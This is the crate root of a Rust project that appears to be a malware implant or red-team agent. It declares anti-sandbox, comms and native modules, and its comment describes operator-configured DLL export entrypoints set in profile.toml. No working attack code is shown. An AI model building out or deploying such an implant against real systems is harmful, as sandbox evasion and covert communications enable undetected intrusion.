#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

mod anti_sandbox;
mod comms;
mod entry;
mod native;
mod utils;
mod wyrm;

//
// Note that the entrypoint is created through the build script for DLLs. If no custom exports are defined
// by the operator, then the default entrypoint for a DLL will be via `run`, otherwise, it will be via the
// custom name provided in the `profile.toml`.
//
